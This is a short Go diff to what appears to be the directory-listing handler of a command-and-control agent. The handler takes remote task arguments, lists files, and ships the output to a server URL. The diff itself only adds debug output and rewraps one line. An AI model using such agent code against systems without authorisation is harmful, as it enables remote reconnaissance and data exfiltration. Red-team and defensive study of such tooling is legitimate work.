@@ -5,11 +5,15 @@ package agent_helper
 import (
 	"fmt"
 	"os"
+	"galleon/debug"
 	"time"
 )
 
 func LsHandler(serverUrl string, taskData map[string]interface{}) {
 	dir, err := ListDirectories(taskData["args"].(string))
+	if debug.Debug {
+		fmt.Printf("[*] ls: %v\n", taskData["args"].(string))
+	}
 	if err != nil {
 		DataShipper(serverUrl, taskData, err.Error())
 		return
@@ -30,7 +34,8 @@ func ListDirectories(directory string) (string, error) {
 		return "", err
 	}
 	for _, file := range files {
-		line := fmt.Sprintf("%-15s %-22v %-10d %-20s\n", file.Mode(), file.ModTime().UTC().Format(time.RFC3339), file.Size(), file.Name())
+		line := fmt.Sprintf("%-15s %-22v %-10d %-20s\n", file.Mode(), 
+		file.ModTime().UTC().Format(time.RFC3339), file.Size(), file.Name())
 		fileList += line
 	}
 	return fileList, nil
